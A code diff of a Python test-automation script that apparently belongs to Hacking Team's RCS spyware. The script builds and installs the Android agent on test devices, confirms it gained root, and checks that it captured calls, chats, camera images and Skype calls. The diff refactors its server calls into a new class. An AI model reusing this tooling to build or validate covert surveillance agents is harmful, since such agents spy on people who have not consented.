@@ -11,14 +11,13 @@ import adb
 import argparse
 import commands
 from scripts.mobile.hardware.utils import wifiutils
+from commands_rcs import CommandsRCS
 
 import package
-from AVCommon import build_common as build
 
 # apk_template = "build/android/install.%s.apk"
 apk_template = "assets/autotest.%s.apk"
 service = 'com.android.dvci'
-
 
 def say(text):
     os.system("say " + text)
@@ -87,20 +86,6 @@ def check_install(dev, results, factory=None):
     return True
 
 
-def check_instances(c, device_id, factory):
-    instances = c.instances_by_factory(device_id, factory)
-    if not instances:
-        print "no previous instances"
-    assert len(instances) <= 1, "too many instances: %s" % instances ;
-    for i in instances:
-        print "... deleted old instance"
-        c.instance_delete(i["_id"])
-    time.sleep(5)
-    instances = c.instances_by_factory(device_id, factory)
-    assert not instances
-    return instances
-
-
 def execute_agent(dev, results):
     processes = adb.ps(dev)
     running = service in processes
@@ -131,32 +116,6 @@ def execute_agent(dev, results):
     say("agent installed, verify root request")
     return True
 
-
-def sync(c, device_id, instances, factory):
-    print "... sleeping for sync"
-    time.sleep(60)
-    for i in range(10):
-        # print "operation: %s, %s" % (operation_id, group_id)
-        instances = c.instances_by_factory(device_id, factory)
-        if not instances:
-            print "... waiting for sync"
-            time.sleep(10)
-        else:
-            break
-    assert len(instances) == 1
-    instance_id = instances[0]['_id']
-    # print "instance_id: %s " % instance_id
-    print "sync: OK"
-    return instance_id
-
-
-def rename_instance(c, instance_id, results):
-    info = c.instance_info(instance_id)
-    c.instance_rename(instance_id, info['name'] + " " + results['device'])
-    info = c.instance_info(instance_id)
-    results['instance_name'] = info['name']
-    print "instance name: %s" % info['name']
-
 def check_su(dev, results):
     packages = adb.get_packages(dev)
     supack = ["supersu", "superuser"]
@@ -168,54 +127,15 @@ def check_su(dev, results):
 
     print "Has SU: ", results["su"]
 
-def check_root(c, instance_id, results, target_id, starts = 1):
-    # check root
-    info_evidences = []
-    counter = 0
 
-    while not info_evidences and counter < 10:
-        infos = c.infos(target_id, instance_id)
-        info_evidences = [e['data']['content'] for e in infos if 'Started' in e['data']['content']]
-        counter += 1
-        if len(info_evidences) < starts:
-            print "... waiting for info Started: %s/%s" % (len(info_evidences), starts)
-            time.sleep(10)
-
-    while not info_evidences and counter < 10:
-        infos = c.infos(target_id, instance_id)
-        info_evidences = [e['data']['content'] for e in infos if 'Root' in e['data']['content'] or 'Started' in e['data']['content']]
-        counter += 1
-        if not info_evidences or not 'Root' in info_evidences[-1]:
-            print "... waiting for info Root: %s" % info_evidences
-            time.sleep(10)
-
-    # print "info_evidences: %s: " % info_evidences
-    if not info_evidences:
-        results['root'] = 'No'
-        print "No Root"
-        return False
-    else:
-        print "root: OK"
-    results['info'] = len(info_evidences) > 0
-    root_method = info_evidences[0]
-    results['root'] = root_method
-    roots = [r for r in info_evidences if 'previous' not in r]
-    # print "roots: %s " % roots
-    assert len(roots) >= 1
-    return True
-
-
-def check_evidences(dev, c, instance_id, results, target_id, timestamp=""):
+def check_evidences(dev, c, results, timestamp=""):
 
     time.sleep(60)
-    evidences = c.evidences(target_id, instance_id)
+    evidences, kinds = c.evidences()
 
-    kinds = {"call": [], "chat": [], "camera": [], "application": []}
-    for e in evidences:
-        t = e['type']
-        if not t in kinds.keys():
-            kinds[t] = []
-        kinds[t].append(e)
+    for k in ["call", "chat", "camera", "application"]:
+         if k not in kinds.keys():
+             kinds[k]= []
 
     ev = "\n"
     ok = kinds.keys()
@@ -291,7 +211,7 @@ def check_uninstall(dev, results, reboot = True):
 
     results["packages_remained"] = res
 
-def check_skype(c, target_id, instance_id, results, dev=None):
+def check_skype(c, results, dev=None):
     supported = ['4.0', '4.1', '4.2', '4.3']
     release = results['release'][0:3]
 
@@ -304,8 +224,8 @@ def check_skype(c, target_id, instance_id, results, dev=None):
     info_evidences = []
     counter = 0
     while not info_evidences and counter < 10:
-        infos = c.infos(target_id, instance_id)
-        info_evidences = [e['data']['content'] for e in infos if 'Call' in e['data']['content']]
+        info_evidences = c.infos('Call')
+
         counter += 1
         if not info_evidences:
             print "... waiting for info"
@@ -354,19 +274,6 @@ def set_properties(dev, device_id, results):
     return results
 
 
-def connect(c, target_name):
-    # logging into server
-    assert c
-    if not c.logged_in():
-        return False
-        # print("Not logged in")
-    else:
-        print "logged in %s: OK" % c.host
-    operation_id, group_id = c.operation(build.connection.operation)
-    target_id = c.targets(operation_id, target_name)[0]
-    return operation_id, target_id
-
-
 def check_reboot(dev, results, delay = 60):
     print "... reboot"
     adb.reboot(dev)
@@ -405,51 +312,38 @@ def test_device(id, dev, args, results):
         wifiutils.uninstall_wifi_enabler(dev)
         exit(0)
 
-    adb.reboot(dev)
+    if args.reboot:
+        adb.reboot(dev)
 
     tests = ["sync","persistence","root", "skype","camera"]
     #tests = ["persistence"]
 
     demo = True
-    build.connection.host = "192.168.100.100" #"rcs-castore"
-    build.connection.operation = "Rite_Mobile"
-    target_name = "HardwareFunctional"
-    factory = 'RCS_0000002050'
+
+    device_id = adb.get_deviceid(dev)
+
+    commands_rcs = CommandsRCS(host = "192.168.100.100", login_id = id, device_id = device_id, operation = "Rite_Mobile", target_name = "HardwareFunctional", factory = 'RCS_0000002050')
 
     #build.connection.host = "rcs-zeus-master.hackingteam.local"
     #build.connection.operation = "Rite_Mobile"
     #target_name = "Functional"
     #factory = "RCS_0000000008"
 
-    if int(args.login) >= 0:
-        login = "qa_android_test_%s" % args.login
-    else:
-        login = "qa_android_test_%s" % id
-    build.create_user(login)
-
-    print "Connecting to %s @ %s : %s" % (build.connection.user, build.connection.host, build.connection.operation)
-    assert build.connection.user == login
-
-    device_id = adb.get_deviceid(dev)
-
-    assert device_id
-    assert len(device_id) >= 8
-
     if args.build or not os.path.exists('assets/autotest.default.apk'):
         config = open('assets/config_mobile.json').read()
-        config = config.replace("$(HOSTNAME)", build.connection.host)
+        config = config.replace("$(HOSTNAME)", commands_rcs.host)
         f = open("build/config.upload.json", "w")
         f.write(config)
         f.close()
 
-        os.system('echo ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -c build/config.upload.json' % (build.connection.user, build.connection.passwd, build.connection.host, factory))
+        os.system('echo ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -c build/config.upload.json' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory))
 
         if demo:
             json = "build.demo.json"
         else:
             json = "build.nodemo.json"
         os.system(
-            'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (build.connection.user, build.connection.passwd, build.connection.host, factory, json))
+            'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json))
         os.system('unzip -o  and.zip -d assets')
         os.remove('and.zip')
     if not os.path.exists('assets/autotest.default.apk'):
@@ -462,13 +356,8 @@ def test_device(id, dev, args, results):
     adb.set_screen_on_and_unlocked(dev)
 
     try:
-        with build.connection() as c:
-            ret = connect(c, target_name)
-            if not ret:
-                return "Not logged in"
-
-            operation_id, target_id = ret
-            instances = check_instances(c, device_id, factory)
+        with commands_rcs as c:
+            commands_rcs.delete_old_instance()
 
             # install agent and check it's running
             if not check_install(dev, results):
@@ -481,17 +370,19 @@ def test_device(id, dev, args, results):
 
             if "sync" in tests:
                 # sync e verifica
-                instance_id = sync(c, device_id, instances, factory)
+                c.wait_for_sync()
 
                 # rename instance
-                rename_instance(c, instance_id, results)
+
+                results['instance_name'] = c.rename_instance(results['device'])
 
                 # check for root
                 check_su(dev, results)
 
-                root = check_root(c, instance_id, results, target_id)
-                results['root_first'] = root
-                check_evidences(dev, c, instance_id, results, target_id, "_first")
+                result, root, info = c.check_root()
+                results['root'] = root
+                results['root_first'] = result
+                check_evidences(dev, c, results, "_first")
 
             time.sleep(20)
 
@@ -499,18 +390,18 @@ def test_device(id, dev, args, results):
                 check_persistence(dev, results, delay=40)
 
             if "root" in tests and "sync" in tests:
-                root = check_root(c, instance_id, results, target_id, 2)
+                result, root, info = c.check_root(2)
                 time.sleep(30)
                 if root and "skype" in tests:
                     # skype call
-                    check_skype(c, target_id, instance_id, results, dev)
+                    check_skype(c, results, dev)
 
             if "camera" in tests:
                 check_camera(dev)
 
             # evidences
             if "sync" in tests:
-                check_evidences(dev, c, instance_id, results, target_id, "_last")
+                check_evidences(dev, c, results, "_last")
 
         if args.interactive:
             say("press enter to uninstall %s" % id)
@@ -586,8 +477,8 @@ def parse_args():
                         help="Interactive execution")
     parser.add_argument('-f', '--fastnet', required=False, action='store_true',
                         help="Install fastnet")
-    parser.add_argument('-l', '--login', required=False, default="-1",
-                        help="Login id")
+    parser.add_argument('-r', '--reboot', required=False, action='store_true',
+                        help="Install fastnet")
 
     args = parser.parse_args()
 
